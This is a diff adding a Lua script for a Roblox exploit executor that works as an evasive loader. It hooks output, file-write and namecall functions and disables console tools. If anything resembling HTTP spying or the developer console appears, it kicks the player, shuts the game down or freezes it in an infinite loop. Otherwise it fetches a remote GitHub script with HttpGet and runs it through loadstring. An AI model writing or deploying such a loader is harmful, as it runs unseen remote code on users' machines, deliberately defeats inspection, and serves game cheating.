@@ -1,0 +1,87 @@
+local function shutdownAndKick()
+    game.Players.LocalPlayer:Kick("bro don't do that")
+    game:Shutdown()
+    while true do end
+end
+
+local function checkForHttp(content)
+    if string.find(string.lower(content), 'http') or string.find(string.lower(content), '//') or string.find(string.lower(content), 'https://discord.com/api/webhooks/') then
+        return true
+    end
+    return false
+end
+
+local httpSpyDetected = false
+
+spawn(function()
+    pcall(function()
+        local functionsToHook = {print, warn, error}
+        for _, func in pairs(functionsToHook) do
+            hookfunction(func, function(...)
+                local args = {...}
+                for _, arg in ipairs(args) do
+                    if checkForHttp(arg) then
+                        httpSpyDetected = true
+                        shutdownAndKick()
+                    end
+                end
+                return func(...)
+            end)
+        end
+        
+        local oldWriteFile = hookfunction(writefile, function(file, content)
+            if checkForHttp(content) then
+                httpSpyDetected = true
+                shutdownAndKick()
+            end
+            return oldWriteFile(file, content)
+        end)
+
+        local oldAppendFile = hookfunction(appendfile, function(file, content)
+            if checkForHttp(content) then
+                httpSpyDetected = true
+                shutdownAndKick()
+            end
+            return oldAppendFile(file, content)
+        end)
+
+        game.DescendantAdded:Connect(function(c)
+            if c and (c:IsA('TextLabel') or c:IsA('TextButton') or c:IsA('Message')) then
+                if checkForHttp(c.Text) then
+                    httpSpyDetected = true
+                    shutdownAndKick()
+                end
+                c:Destroy()
+            end
+        end)
+
+        getgenv().rconsoletitle = nil
+        getgenv().rconsoleprint = nil
+        getgenv().rconsolewarn = nil
+        getgenv().rconsoleinfo = nil
+        getgenv().rconsolerr = nil
+        getgenv().clonefunction = function(...) while true do end return end
+
+        game.CoreGui.ChildAdded:Connect(function(c)
+            if string.lower(c.Name) == 'devconsolemaster' then
+                httpSpyDetected = true
+                shutdownAndKick()
+                c:Destroy()
+            end
+        end)
+
+        local oldNamecall
+        oldNamecall = hookmetamethod(game, '__namecall', newcclosure(function(self, ...)
+            local method = getnamecallmethod()
+            if string.find(string.lower(method), 'rconsole') or string.lower(method) == 'warn' or string.lower(method) == 'error' or string.lower(method) == 'rendernametag' then
+                httpSpyDetected = true
+                shutdownAndKick()
+            end
+            return oldNamecall(self, ...)
+        end))
+
+        if not httpSpyDetected then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/m1M-Plqer819/synx/main/Mbm%20Hub/-_-.lua"))()
+        end
+    end)
+end)
